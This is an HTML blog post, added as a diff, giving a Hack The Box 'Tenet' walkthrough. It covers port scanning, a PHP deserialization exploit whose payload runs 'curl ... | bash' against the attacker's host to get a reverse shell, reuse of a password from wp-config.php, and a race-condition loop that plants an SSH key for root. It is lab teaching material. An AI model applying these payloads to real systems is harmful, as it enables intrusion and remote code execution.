@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Tenet Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tenet Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Tenet Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Tenet is Linux based machine that was active since January 16th of 2021 to June 12th, on this machine we will find a php file and its backup inside an Apache webserver, reviewing the code we will see that user input isn’t sanitized allowing us to perform PHP desrialization to get command execution, once inside the machine we will find the password of another user inside wordpress’s config file, this user can run as root a bash script that would allow us to add our own ssh public key as an authorized key for root user." />
+<meta property="og:description" content="Tenet is Linux based machine that was active since January 16th of 2021 to June 12th, on this machine we will find a php file and its backup inside an Apache webserver, reviewing the code we will see that user input isn’t sanitized allowing us to perform PHP desrialization to get command execution, once inside the machine we will find the password of another user inside wordpress’s config file, this user can run as root a bash script that would allow us to add our own ssh public key as an authorized key for root user." />
+<link rel="canonical" href="http://localhost:8000/Tenet" />
+<meta property="og:url" content="http://localhost:8000/Tenet" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/tenet/tenet.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-12T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/tenet/tenet.png" />
+<meta property="twitter:title" content="Tenet Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-06-12T00:00:00-05:00","datePublished":"2021-06-12T00:00:00-05:00","description":"Tenet is Linux based machine that was active since January 16th of 2021 to June 12th, on this machine we will find a php file and its backup inside an Apache webserver, reviewing the code we will see that user input isn’t sanitized allowing us to perform PHP desrialization to get command execution, once inside the machine we will find the password of another user inside wordpress’s config file, this user can run as root a bash script that would allow us to add our own ssh public key as an authorized key for root user.","headline":"Tenet Writeup [HTB]","image":"http://localhost:8000/assets/images/tenet/tenet.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Tenet"},"url":"http://localhost:8000/Tenet"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/tenet/tenet.png/../banner.png>
+  
+  <h2>Tenet Writeup [HTB]</h2>
+  <time datetime="2021-06-12T00:00:00-05:00" class="by-line">12 Jun 2021</time>
+  <p>Tenet is Linux based machine that was active since January 16th of 2021 to June 12th, on this machine we will find a php file and its backup inside an Apache webserver, reviewing the code we will see that user input isn’t sanitized allowing us to perform PHP desrialization to get command execution, once inside the machine we will find the password of another user inside wordpress’s config file, this user can run as root a bash script that would allow us to add our own ssh public key as an authorized key for root user.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.223
+nmap -sC -sV -p 80,22, -Pn -o scan.txt 10.10.10.223
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>There is only two ports open, ssh and a webpage on port 80, if we check we find only the default apache page, so let’s use feroxbuster and see what we can find.</p>
+
+<p><img src="/assets/images/tenet/feroxbuster.png" alt="" /></p>
+
+<p>We find a directory called worpress, so we go to see what’s there.</p>
+
+<p><img src="/assets/images/tenet/wordpress.png" alt="" /></p>
+
+<p>The site says “Nothing here” and give us a link to “tenet.htb”, so we add it to our hosts file, exploring the site we find a comment that calls our attention.</p>
+
+<p><img src="/assets/images/tenet/comment.png" alt="" /></p>
+
+<p>There we see that a file, “sator php”, is mentioned, so we try to access to “sator.php” on different endpoints, we find it on “http://10.10.10.223/sator.php”, when we acces to it we get some lines.</p>
+
+<p><img src="/assets/images/tenet/sator.png" alt="" /></p>
+
+<p>The comment also talked about a backup file, and we find it on “http://10.10.10.223/sator.php.bak”.</p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>Now we have access to sator’s source code:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
+        <span class="p">}</span>
+
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+                <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
+        <span class="c1">//      echo 'Gotta get this working properly...';</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>As soon as we open the file a word calls our attention, <code class="language-plaintext highlighter-rouge">unserialize</code>, and on the class there is a magic method, <code class="language-plaintext highlighter-rouge">__destruct</code>, so the conditions for php deserialization are met. PHP deserialization allows us to call a function but manipulating some values, if we check the code it grabs some data and writes it to “users.txt”, if we go to “http://10.10.10.223/users.txt” we see that it exist, that means we can write to a file that is exposed through the web server, so let’s write a php file that serialiazes a function that writes a reverse shell to a file with php extension.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$user_file</span><span class="o">=</span><span class="s1">'reaaaalylongtext.php'</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$data</span><span class="o">=</span><span class="s1">'&lt;?php system("curl 10.10.14.205:8000/shell.sh | bash")?&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$out</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After executing it we get the string: <code class="language-plaintext highlighter-rouge">O:14:"DatabaseExport":2:{s:9:"user_file";s:20:"reaaaalylongtext.php";s:4:"data";s:56:"&lt;?php system("curl 10.10.14.205:8000/shell.sh | bash")?&gt;";}</code>, going back to the source code of sator, we see that the object to be deserialized is send through a GET request on arepo argument. We use burp to url encode the object and don’t have any problem sending it, so we end making a request to: <code class="language-plaintext highlighter-rouge">http://10.10.10.223/sator.php?arepo=O%3a14%3a"DatabaseExport"%3a2%3a{s%3a9%3a"user_file"%3bs%3a20%3a"reaaaalylongtext.php"%3bs%3a4%3a"data"%3bs%3a56%3a"&lt;%3fphp+system("curl+10.10.14.205%3a8000/shell.sh+|+bash")%3f&gt;"%3b}</code></p>
+
+<p><img src="/assets/images/tenet/burp.png" alt="" /></p>
+
+<p>As usual the command retrieves the file shell.sh from a http server on port 8000, se let’s start a http server with python and then access to “http://10.10.10.223/reaaaalylongtext.php”, with that we get a shell to the machine.</p>
+
+<p><img src="/assets/images/tenet/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-1"></a>Lateral Movement</h1>
+
+<p>We saw that there is a wordpress site, so let’s check its config file, it’s located at /var/www/html/wordpress/wp-config.php.</p>
+
+<p><img src="/assets/images/tenet/wpconfig.png" alt="" /></p>
+
+<p>The user for the database is neil, there is also a user called neil, and he uses the same password, so we can access now through SSH and get the file user.txt.</p>
+
+<p><img src="/assets/images/tenet/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Let’s check if we can run anything with sudo.</p>
+
+<p><img src="/assets/images/tenet/sudo.png" alt="" /></p>
+
+<p>We see that we can run /usr/local/bin/enableSSH.sh, with sudo, so let’s see what it does.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+checkAdded<span class="o">()</span> <span class="o">{</span>
+
+	<span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+		/bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
+	<span class="k">else</span>
+		/bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
+	<span class="k">fi</span>
+
+<span class="o">}</span>
+
+checkFile<span class="o">()</span> <span class="o">{</span>
+
+	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+		/bin/echo <span class="s2">"Error in creating key file!"</span>
+		<span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
+		</span><span class="nb">exit </span>1
+	<span class="k">fi</span>
+
+<span class="o">}</span>
+
+addKey<span class="o">()</span> <span class="o">{</span>
+
+	<span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>
+	<span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>
+	/bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>
+	checkFile <span class="nv">$tmpName</span>
+	/bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys
+	/bin/rm <span class="nv">$tmpName</span>
+
+<span class="o">}</span>
+
+<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
+addKey
+checkAdded
+</code></pre></div></div>
+
+<p>The file has the root ssh public key harcoded, it creates a file inside tmp folder that starts with “ssh-“ followed by a random chain, writes the public key on it, then sends its content to “/root/.ssh/authorized_keys” and erases the file, then it checks if “root@ubuntu” text is inside the authorized keys, if it finds it, it shows “Successfully added”, otherwise says “Error in adding”.
+We can clearly see a kind of race condition, since it writes a file to a public location and then it uses it to write on authorized keys we can modify that file so it adds our own key, we just have to be quick, also since the script appends to authorized_keys file rather than replacing it we can’t rely on the ouput message, since the root text found could be one that is on the file from before, so we just have to try to access after every execution.
+First we generate a pair of ssh keys, <code class="language-plaintext highlighter-rouge">ssh-keygen</code>, then we make a one liner that echoes the public key to any file that start with ssh, something like <code class="language-plaintext highlighter-rouge">echo &lt;public key&gt; &gt; ssh*</code>, the problem with that is that it creates a file called “ssh*” if there isn’t any file starting with ssh, and if there is more than one file starting with ssh we get the error of ambiguos redirect, so to avoid that we always remove that file before running the echo, <code class="language-plaintext highlighter-rouge">rm ssh\*</code>, finally we just need to put that inside a while loop so those commands are running as fast as possible to catch the file that is written in /tmp: <code class="language-plaintext highlighter-rouge">while true; do rm ssh\* 2&gt; /dev/null;echo "&lt;public key&gt;" &gt; ssh*;done</code>. Now in other terminal (or in the same one if you backgrounded the last command adding “&amp;” at the end) we run <code class="language-plaintext highlighter-rouge">sudo enableSSH.sh</code>, as I said before we can’t rely on its out, so we just have to test if we can ssh as root with our ssh private key, once we can get in we are finished with the machine.</p>
+
+<p><img src="/assets/images/tenet/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#php-deserialization"> PHP deserialization</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
